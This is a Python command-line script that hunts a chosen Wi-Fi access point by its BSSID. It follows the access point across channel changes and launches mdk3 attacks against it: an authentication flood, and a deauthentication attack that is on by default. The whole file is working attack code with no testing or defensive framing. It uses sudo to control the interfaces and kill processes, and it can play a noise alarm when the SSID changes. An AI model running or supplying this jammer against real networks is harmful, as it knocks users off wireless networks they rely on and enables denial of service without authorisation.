import os
import re
import subprocess
import threading
from time import sleep
from typing import Any

import click
from rich.console import Console
from rich.traceback import install

from logger import logger

console: Console = Console()


install()


devnull = open(os.devnull, "wt")


class Target:
    obj = None

    def __new__(cls, *args, **kwargs):
        if cls.obj is None:
            cls.obj = super().__new__(cls)

        return cls.obj

    def __init__(self, bssid: str) -> None:
        self.bssid = bssid.lower()
        self.channel = None
        self.ssid = None

    def __setattr__(self, name: str, value: Any, /) -> None:
        if hasattr(self, name):
            if (
                name == "ssid"
                and self.ssid is not None
                and self.ssid != value
                and _play_sound_when_ssid_changed
            ):
                threading.Thread(
                    target=subprocess.run,
                    args=(
                        [
                            "aplay",
                            "--duration",
                            "30",
                            "--channels=11",
                            "--file-type",
                            "raw",
                            "--rate=2220",
                            "--format=u8",
                            "/dev/random",
                        ],
                    ),
                    kwargs={"stdout": devnull, "stderr": devnull},
                ).start()

            super().__setattr__(name, value)

            if self.bssid and hasattr(self, "ssid") and self.channel:
                logger.success(
                    rf"The target was found <b>{self.bssid!r} ({self.ssid})</b> on <b>{self.channel!r}</b> channel!"
                )

                logger.info(f"Set up the {_interface_monitored} link.")
                subprocess.run(
                    ["sudo", "ip", "link", "set", _interface_monitored, "up"],
                    stderr=devnull,
                    stdout=devnull,
                )

                logger.info(f"Change the channel to <cyan>{self.channel!r}</cyan>.")
                threading.Thread(
                    target=subprocess.run,
                    args=(
                        [
                            "sudo",
                            "iw",
                            "dev",
                            f"{_interface_monitored}",
                            "set",
                            "channel",
                            f"{self.channel}",
                        ],
                    ),
                    kwargs={"stdout": devnull, "stderr": devnull},
                ).start()

                if _mdk3_a_mode or _mdk3_d_mode:
                    logger.info("Starting the <b>mdk3</b> sub processe(s)...")

                if _mdk3_a_mode:
                    threading.Thread(
                        target=subprocess.run,
                        args=(
                            [
                                "sudo",
                                "mdk3",
                                _interface_monitored,
                                "a",
                                "-a",
                                self.bssid,
                                "-c",
                                "-m",
                            ],
                        ),
                        kwargs={"stdout": devnull, "stderr": devnull},
                    ).start()

                if _mdk3_d_mode:
                    threading.Thread(
                        target=subprocess.run,
                        args=(["sudo", "mdk3", _interface_monitored, "d"],),
                        kwargs={"stdout": devnull, "stderr": devnull},
                    ).start()

        return super().__setattr__(name, value)

    def __repr__(self) -> str:
        return f"<Target bssid={self.bssid!r} channel={self.channel!r}>"


def refresh():
    while True:
        logger.info("Killing previous processes...")

        os.system("sudo pkill -9 mdk3 > /dev/null 2>&1; ")
        os.system("sudo pkill -9 airodump-ng > /dev/null 2>&1; ")

        logger.info(f"Set down the {_interface_monitored} link.")
        subprocess.run(
            ["sudo", "ip", "link", "set", _interface_monitored, "down"],
            stderr=devnull,
            stdout=devnull,
        )

        logger.info(f"Set up the {_interface_managed} link.")
        subprocess.run(
            ["sudo", "ip", "link", "set", _interface_managed, "up"],
            stderr=devnull,
            stdout=devnull,
        )

        logger.info(f"Scanning...")
        process = subprocess.run(
            ["sudo", "iw", "dev", _interface_managed, "scan"],
            capture_output=True,
            text=True,
            check=False,
        )

        logger.info(f"Set down the {_interface_managed} link.")
        subprocess.run(
            ["sudo", "ip", "link", "set", _interface_managed, "down"],
            stderr=devnull,
            stdout=devnull,
        )

        logger.info(f"Extracting the BSSID and Channel...")
        process = subprocess.run(
            ["egrep", "^BSS|SSID:|channel:|set: channel"],
            capture_output=True,
            input=process.stdout,
            text=True,
            check=False,
        )

        lst = []

        for a in [
            "\n".join([y.strip() for y in x.strip().split("\n")])
            for x in process.stdout.split("BSS")
            if x
        ]:
            item = []
            if search := re.search("([A-Za-z0-9]{2}:){1,}..", a):
                start, end = search.span()
                item.append(a[start:end])

            vals = []
            if search := re.search("channel:?.[0-9]{1,}", a):
                start, end = search.span()
                vals.append(
                    int(x) if (x := re.sub("channel:?.", "", a[start:end])) else None,
                )

            if search := re.search("SSID:.*", a):
                start, end = search.span()
                vals.append(re.sub("SSID:.", "", a[start:end]))
            else:
                vals.append(None)

            item.append(vals)
            lst.append(item)

        dct = dict(lst)

        if Target.obj is not None and (target := dct.get(Target.obj.bssid)):
            channel, ssid = target
            if channel:
                logger.info(f"Update channel to {channel!r}.")

                Target.obj.ssid = ssid
                Target.obj.channel = channel

                logger.info(f"Sleep {_interval} for seconds.")
                sleep(_interval)

        sleep(2.5)


@click.command()
@click.option("--bssid", type=str, required=True, help="Specify the target BSSID.")
@click.option("--interval", type=int, default=60)
@click.option("--mdk3-a-mode", is_flag=True, default=False)
@click.option("--mdk3-d-mode", is_flag=True, default=True)
@click.option("--play-sound-when-ssid-changed", is_flag=True, default=False)
@click.argument("interface_managed")
@click.argument("interface_monitored")
def main(
    bssid: str,
    interval,
    mdk3_a_mode,
    mdk3_d_mode,
    play_sound_when_ssid_changed,
    interface_managed,
    interface_monitored,
) -> None:
    logger.debug(rf"BSSID: <b>{bssid!r}</b>")
    logger.debug(rf"Interval: <b>{interval!r}</b>")
    logger.debug(rf"Managed Interface: <b>{interface_managed!r}</b>")
    logger.debug(rf"Monitored Interface: <b>{interface_monitored!r}</b>")

    global _interface_managed
    global _interface_monitored
    global _mdk3_a_mode
    global _mdk3_d_mode
    global _interval
    global _play_sound_when_ssid_changed

    _interface_managed = interface_managed
    _interface_monitored = interface_monitored
    _mdk3_a_mode = mdk3_a_mode
    _mdk3_d_mode = mdk3_d_mode
    _interval = interval
    _play_sound_when_ssid_changed = play_sound_when_ssid_changed

    threading.Thread(target=refresh).start()

    Target(bssid)


if __name__ == "__main__":
    main()
